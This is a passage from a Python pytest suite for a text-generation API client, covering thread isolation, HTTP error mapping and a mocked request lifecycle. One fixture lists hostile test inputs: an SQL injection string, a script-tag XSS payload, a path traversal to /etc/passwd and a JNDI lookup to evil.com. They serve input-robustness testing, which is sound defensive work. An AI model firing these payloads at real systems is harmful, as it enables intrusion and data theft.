            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # All should be cancelled
            for result in results:
                assert isinstance(result, asyncio.CancelledError)
            
            # Verify cleanup occurred
            assert len(cancelled_tasks) == 5

    def test_thread_local_storage_isolation(self):
        """
        Test that thread-local storage correctly isolates API instances.
        """
        import threading
        import queue
        
        thread_results = queue.Queue()
        
        def worker_thread(thread_id):
            # Each thread creates its own API instance
            api = GenesisAPI(
                api_key=f"thread_{thread_id}_key",
                base_url=f"https://api{thread_id}.genesis.example.com"
            )
            
            thread_results.put({
                'thread_id': thread_id,
                'api_key': api.api_key,
                'base_url': api.base_url
            })
        
        # Start multiple worker threads
        threads = []
        for i in range(5):
            thread = threading.Thread(target=worker_thread, args=(i,))
            threads.append(thread)
            thread.start()
        
        # Wait for completion
        for thread in threads:
            thread.join()
        
        # Verify each thread had isolated configuration
        results = []
        while not thread_results.empty():
            results.append(thread_results.get())
        
        assert len(results) == 5
        
        # Verify isolation
        for result in results:
            thread_id = result['thread_id']
            assert result['api_key'] == f"thread_{thread_id}_key"
            assert result['base_url'] == f"https://api{thread_id}.genesis.example.com"


# Parameterized test for comprehensive HTTP status code coverage
@pytest.mark.parametrize("status_code,error_data,expected_exception_type", [
    (400, {"error": "Bad Request"}, GenesisAPIError),
    (401, {"error": "Unauthorized"}, GenesisAPIAuthenticationError),
    (402, {"error": "Payment Required"}, GenesisAPIError),
    (403, {"error": "Forbidden"}, GenesisAPIAuthenticationError),
    (404, {"error": "Not Found"}, GenesisAPIError),
    (405, {"error": "Method Not Allowed"}, GenesisAPIError),
    (406, {"error": "Not Acceptable"}, GenesisAPIError),
    (408, {"error": "Request Timeout"}, GenesisAPITimeoutError),
    (409, {"error": "Conflict"}, GenesisAPIError),
    (410, {"error": "Gone"}, GenesisAPIError),
    (413, {"error": "Payload Too Large"}, GenesisAPIError),
    (414, {"error": "URI Too Long"}, GenesisAPIError),
    (415, {"error": "Unsupported Media Type"}, GenesisAPIError),
    (422, {"error": "Unprocessable Entity"}, GenesisAPIError),
    (429, {"error": "Too Many Requests"}, GenesisAPIRateLimitError),
    (500, {"error": "Internal Server Error"}, GenesisAPIServerError),
    (501, {"error": "Not Implemented"}, GenesisAPIServerError),
    (502, {"error": "Bad Gateway"}, GenesisAPIServerError),
    (503, {"error": "Service Unavailable"}, GenesisAPIServerError),
    (504, {"error": "Gateway Timeout"}, GenesisAPIServerError),
    (505, {"error": "HTTP Version Not Supported"}, GenesisAPIServerError),
])
def test_comprehensive_http_status_code_handling(status_code, error_data, expected_exception_type):
    """
    Test comprehensive HTTP status code handling with expected exception types.
    
    Parameters:
        status_code (int): HTTP status code to test
        error_data (dict): Error response data
        expected_exception_type (type): Expected exception type to be raised
    """
    with pytest.raises(expected_exception_type):
        handle_genesis_error(status_code, error_data)


# Additional fixtures for the new comprehensive tests
@pytest.fixture
def extreme_test_data():
    """
    Provides extreme test data for boundary and stress testing.
    
    Returns:
        dict: Contains extreme values for various test scenarios including
              very long strings, large numbers, and edge case values.
    """
    return {
        "very_long_prompt": "A" * 100000,
        "unicode_heavy_prompt": "🌍" * 1000 + "世界" * 1000 + "مرحبا" * 1000,
        "large_token_count": 999999,
        "precision_temperature": 0.123456789012345,
        "edge_timestamps": [0, 1, 2147483647, 4294967295],
        "malicious_inputs": [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
            "\x00\x01\x02\xff\xfe\xfd"
        ]
    }


@pytest.fixture
def network_simulation_params():
    """
    Provides network simulation parameters for testing network conditions.
    
    Returns:
        dict: Contains parameters for simulating various network conditions
              including latency, packet loss, connection timeouts, etc.
    """
    return {
        "latency_values": [0.1, 0.5, 1.0, 2.0, 5.0],
        "timeout_scenarios": [1, 5, 10, 30, 60],
        "retry_intervals": [1, 2, 4, 8, 16, 32],
        "connection_errors": [
            "Connection refused",
            "Network unreachable", 
            "Host unreachable",
            "Connection timeout",
            "SSL handshake failed"
        ]
    }


# Final comprehensive validation test
class TestGenesisAPICompleteIntegration:
    """Complete end-to-end integration testing."""
    
    @pytest.mark.asyncio
    async def test_full_api_lifecycle_with_all_features(self):
        """
        Test the complete API lifecycle with all features enabled.
        
        This comprehensive test exercises the full API functionality including
        initialization, request formatting, response parsing, error handling,
        retry logic, and resource cleanup.
        """
        # Test with custom configuration
        api = GenesisAPI(
            api_key="comprehensive_test_key",
            base_url="https://api.genesis.example.com",
            timeout=45,
            max_retries=5
        )
        
        # Test various request scenarios
        test_scenarios = [
            {
                "prompt": "Simple test prompt",
                "model": "genesis-v1",
                "max_tokens": 100,
                "temperature": 0.7
            },
            {
                "prompt": "Unicode test: 世界 🌍 café",
                "model": "genesis-v2", 
                "max_tokens": 200,
                "temperature": 0.0
            },
            {
                "prompt": "Edge case test with special chars: \n\t\"'\\",
                "model": "genesis-v1",
                "max_tokens": 50,
                "temperature": 1.0
            }
        ]
        
        for i, scenario in enumerate(test_scenarios):
            mock_response = {
                "id": f"comprehensive_test_id_{i}",
                "text": f"Comprehensive response {i}",
                "model": scenario["model"],
                "created": 1234567890 + i,
                "usage": {
                    "prompt_tokens": len(scenario["prompt"]) // 4,
                    "completion_tokens": scenario["max_tokens"] // 2
                }
            }
            
            with patch('aiohttp.ClientSession.post') as mock_post:
                mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
                mock_post.return_value.__aenter__.return_value.status = 200
                
                result = await api.generate_text(**scenario)
                
                # Verify all aspects of the response
                assert result.id == f"comprehensive_test_id_{i}"
                assert result.text == f"Comprehensive response {i}"
                assert result.model == scenario["model"]
                assert result.created == 1234567890 + i
                assert isinstance(result.usage, dict)
                assert "prompt_tokens" in result.usage
                assert "completion_tokens" in result.usage
                
                # Verify request was properly formatted
                call_args = mock_post.call_args
                request_data = call_args[1]['json']
                assert request_data['prompt'] == scenario['prompt']
                assert request_data['model'] == scenario['model']
                assert request_data['max_tokens'] == scenario['max_tokens']
                assert request_data['temperature'] == scenario['temperature']

